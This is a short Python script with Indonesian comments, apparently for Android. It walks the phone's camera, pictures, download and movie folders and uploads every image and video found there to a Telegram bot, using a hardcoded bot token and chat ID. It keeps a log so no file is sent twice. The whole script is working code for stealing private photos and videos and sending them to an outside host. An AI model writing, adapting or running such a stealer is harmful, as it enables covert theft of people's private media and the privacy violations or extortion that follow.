import os
import glob
import time
import requests

# ======== GANTI PUNYA LU, YANG MULIA ========
BOT_TOKEN = "8761282481:AAGfjhxK7rcjUd-Do1rlAJ4iSkVt5QBwiCE"
CHAT_ID   = "8761282481"
# ===========================================

EXTENSIONS = ['*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp','*.heic','*.mp4','*.mkv','*.avi','*.mov','*.3gp']
TARGETS = [
    '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
    '/sdcard/Movies', '/storage/emulated/0/DCIM',
    '/storage/emulated/0/Pictures', '/storage/emulated/0/Download'
]
LOG = 'sent.txt'

def sudah_kirim():
    if os.path.exists(LOG):
        with open(LOG) as f:
            return set(f.read().splitlines())
    return set()

def catat(path):
    with open(LOG, 'a') as f:
        f.write(path + '\n')

def kirim(file):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    try:
        with open(file, 'rb') as f:
            resp = requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID}, timeout=30)
            if resp.status_code == 200 and resp.json().get('ok'):
                print(f'[OK] {file}')
                catat(file)
                return True
            else:
                print(f'[GAGAL] {file}')
                return False
    except Exception as e:
        print(f'[ERROR] {file}: {e}')
        return False

def main():
    sent = sudah_kirim()
    total = 0
    for base in TARGETS:
        if not os.path.exists(base): continue
        print(f'[*] Scan: {base}')
        for ext in EXTENSIONS:
            for f in glob.glob(f'{base}/**/{ext}', recursive=True):
                if f in sent: continue
                if os.path.getsize(f) < 10240: continue  # skip kecil
                total += 1
                print(f'[→] {total}: {os.path.basename(f)}')
                kirim(f)
                time.sleep(0.5)  # hindari limit
    print(f'\n✅ Selesai! Total dikirim: {total}')

if __name__ == '__main__':
    main()
